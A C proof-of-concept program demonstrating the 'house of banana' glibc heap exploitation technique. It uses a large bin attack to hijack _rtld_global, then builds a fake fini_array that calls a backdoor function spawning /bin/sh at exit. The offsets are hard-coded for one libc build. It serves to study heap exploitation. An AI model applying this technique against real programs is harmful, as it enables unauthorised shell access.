#include <stdio.h>
#include <stdlib.h>

void backdoor() {
   puts("you hacked me!!");
   system("/bin/sh");
}

int main() {
   puts("\033[32mhouse of banana's poc\033[0m");
   size_t libc_base = *(size_t*)&stdin - 0x1ec980;
   printf("\033[31mlibc_base: %lx\033[0m\n", libc_base);
   size_t _rtld_global_ptr_addr = libc_base + 0x823d108;
   printf("\033[31m_rtkd_global_ptr_addr: %lx\033[0m\n", _rtld_global_ptr_addr);
   char *ptr0 = malloc(0x450);
   char *gap = malloc(0x10);
   char *ptr1 = malloc(0x440);
   gap = malloc(0x10);
   char *ptr2 = malloc(0x410);
   gap = malloc(0x10);

   free(ptr0);
   //put ptr0 into large bin
   malloc(0x500);
   free(ptr1); //free ptr1 into unsorted bin
   free(ptr2); //free ptr2 into unsorted bin
   //bk_nextsize = _rtld_global_ptr_addr
   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x20;
   malloc(0x410); //large bin attack to hijack _rtld_global_ptr

   //fake a _rtld_global
   size_t fake_rtld_global_addr = (size_t)ptr1 - 0x10;
   size_t *fake_rtld_global = (size_t *)ptr1;
   char buf[0x100];
   //the chain's length must >= 4
   fake_rtld_global[1] = (size_t)&fake_rtld_global[2];
   fake_rtld_global[3] = fake_rtld_global_addr;

   fake_rtld_global[2+3] = (size_t)&fake_rtld_global[3];
   fake_rtld_global[2+5] = (size_t)&fake_rtld_global[2];

   fake_rtld_global[3+3] = (size_t)&fake_rtld_global[8];
   fake_rtld_global[3+5] = (size_t)&fake_rtld_global[3];

   fake_rtld_global[8+3] = 0;
   fake_rtld_global[8+5] = (size_t)&fake_rtld_global[8];


   //fake a fini_array segment
   fake_rtld_global[0x20] = (size_t)&fake_rtld_global[0x30];
   fake_rtld_global[0x22] = (size_t)&fake_rtld_global[0x23];
   fake_rtld_global[0x23+1] = 0x8; //func ptrs total len


   fake_rtld_global[0x30] = 0x1A;
   fake_rtld_global[0x31] = 0;
   fake_rtld_global[-2] = (size_t)&fake_rtld_global[0x32];

   //funcs
   fake_rtld_global[0x32] = (size_t)backdoor;


   fake_rtld_global[0x61] = 0x800000000;
   return 0;
}
